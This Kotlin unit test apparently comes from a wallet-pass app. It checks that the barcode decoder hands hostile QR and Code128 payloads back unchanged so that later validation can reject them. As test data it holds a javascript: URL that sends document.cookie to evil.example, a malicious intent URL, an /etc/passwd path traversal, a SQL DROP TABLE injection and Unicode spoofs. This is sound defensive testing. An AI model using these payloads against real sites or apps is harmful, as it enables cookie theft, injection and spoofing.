package `is`.walt.passes.barcode

import com.google.common.truth.Truth.assertThat
import com.google.zxing.BarcodeFormat
import com.google.zxing.EncodeHintType
import com.google.zxing.MultiFormatWriter
import com.google.zxing.RGBLuminanceSource
import `is`.walt.passes.core.BarcodeDecodeResult
import `is`.walt.passes.core.ScannableFormat
import org.junit.Test

/**
 * The hostile-payload half of the wpass-zrt.5 security suite, on the JVM. The trust claim
 * under test is the decoder's faithfulness contract (wpass-zrt epic, threat-vector 3): the
 * symbol decode returns the payload bytes EXACTLY as the symbol carried them and never
 * silently mangles, normalizes, truncates, or acts on them. Classification and validation
 * are the consumer's job downstream (`QrPayloadClassifier` / `ScannableCardInputValidator`);
 * if this decoder were to "clean up" a payload, the consumer would validate a string that is
 * not what the symbol actually held — exactly the bug class the centralized boundary exists
 * to prevent.
 *
 * Each case encodes a deliberately hostile string with ZXing's own writer and decodes it back
 * through the production [decodeLuminance] path (same roster allowlist, same TRY_HARDER hint),
 * asserting the decoded payload is byte-for-byte the input. This is the pixel→symbol contract
 * the on-device decode runs minus the platform `Bitmap` glue (the instrumented half,
 * [BarcodeDecodeServiceInstrumentedTest]). It complements [ZxingBarcodeSymbolDecoderTest],
 * which proves benign roster payloads round-trip; this proves ADVERSARIAL payloads round-trip
 * unchanged rather than being silently sanitized.
 *
 * QR carries the Unicode-bearing cases because it is the only roster symbology with a byte/ECI
 * mode; the linear symbologies (Code128) cover the ASCII control/scheme cases to prove the
 * faithfulness contract is not QR-specific.
 */
class HostilePayloadFidelityTest {
    @Test
    fun rtlOverrideIsReturnedVerbatim() {
        // A right-to-left override (U+202E) is the classic filename/URL spoof. The decoder
        // must hand it back intact so the consumer can see and reject it — not strip it.
        assertQrRoundTrips("invoice‮gnp.exe")
    }

    @Test
    fun zeroWidthAndControlCharsAreReturnedVerbatim() {
        // Zero-width space/joiner/non-joiner and a BEL control char: homograph/obfuscation
        // tooling. None may be dropped or collapsed.
        assertQrRoundTrips("WALT​‌‍PASS")
    }

    @Test
    fun homoglyphDomainIsReturnedVerbatim() {
        // A Cyrillic 'а' (U+0430) standing in for Latin 'a' — a punycode-spoof domain. The
        // decoder must not NFC/NFKC-normalize it into the Latin letter; the consumer needs
        // the real codepoints to detect the spoof.
        assertQrRoundTrips("https://аpple.com/login")
    }

    @Test
    fun javascriptSchemeUrlIsReturnedVerbatim() {
        // The decoder must NOT recognize or act on an actionable scheme; it returns the
        // string and the consumer decides. Faithfulness is what makes "never auto-act" real.
        assertQrRoundTrips("javascript:fetch('https://evil.example/'+document.cookie)")
    }

    @Test
    fun intentSchemeUrlIsReturnedVerbatim() {
        assertQrRoundTrips(
            "intent://scan/#Intent;scheme=zxing;package=com.evil.app;S.payload=x;end",
        )
    }

    @Test
    fun customSchemeUrlIsReturnedVerbatim() {
        assertQrRoundTrips("walt://import?card=../../etc/passwd")
    }

    @Test
    fun sqlMetacharactersAreReturnedVerbatim() {
        // The storage layer is parameterized (passes-storage), but the faithfulness contract
        // is upstream of that: the decoder returns the bytes, it does not escape them.
        assertQrRoundTrips("'; DROP TABLE scannable_cards;--")
    }

    @Test
    fun oversizedPayloadIsReturnedVerbatim() {
        // A long payload (still within QR capacity) must round-trip whole — no truncation to
        // a "reasonable" length inside the decoder.
        val long = buildString { repeat(800) { append("AB7-") } }
        assertQrRoundTrips(long)
    }

    @Test
    fun newlineAndTabWhitespaceIsReturnedVerbatim() {
        // Embedded newlines/tabs are how a payload smuggles a second logical line past a
        // naive single-line UI. The decoder preserves them; the consumer's validator rejects.
        assertQrRoundTrips("LINE1\r\nLINE2\tTAB")
    }

    @Test
    fun code128AsciiSchemePayloadIsReturnedVerbatim() {
        // Proves the faithfulness contract is not QR-specific: a linear symbology carries an
        // actionable-scheme ASCII payload back unchanged too.
        assertRoundTrips(
            "javascript:alert(1)",
            BarcodeFormat.CODE_128,
            ScannableFormat.Code128,
            width = 800,
            height = 200,
        )
    }

    @Test
    fun code128SqlMetacharactersAreReturnedVerbatim() {
        assertRoundTrips(
            "1';--",
            BarcodeFormat.CODE_128,
            ScannableFormat.Code128,
            width = 400,
            height = 200,
        )
    }

    private fun assertQrRoundTrips(payload: String) =
        assertRoundTrips(payload, BarcodeFormat.QR_CODE, ScannableFormat.Qr, width = 600, height = 600)

    /**
     * Encode [payload] as [format] (UTF-8 ECI so Unicode survives), decode through the
     * production [decodeLuminance], and assert the payload is returned byte-for-byte with the
     * expected roster [scannableFormat].
     */
    private fun assertRoundTrips(
        payload: String,
        format: BarcodeFormat,
        scannableFormat: ScannableFormat,
        width: Int,
        height: Int,
    ) {
        val source = encode(payload, format, width, height)

        assertThat(decodeLuminance(source))
            .isEqualTo(BarcodeDecodeResult.DecodedBarcode(payload, scannableFormat))
    }

    private fun encode(
        content: String,
        format: BarcodeFormat,
        width: Int,
        height: Int,
    ): RGBLuminanceSource {
        val hints = mapOf(EncodeHintType.CHARACTER_SET to "UTF-8")
        val matrix = MultiFormatWriter().encode(content, format, width, height, hints)
        val w = matrix.width
        val h = matrix.height
        val pixels = IntArray(w * h)
        for (y in 0 until h) {
            val row = y * w
            for (x in 0 until w) {
                pixels[row + x] = if (matrix.get(x, y)) BLACK else WHITE
            }
        }
        return RGBLuminanceSource(w, h, pixels)
    }

    private companion object {
        const val BLACK = 0xFF000000.toInt()
        const val WHITE = 0xFFFFFFFF.toInt()
    }
}
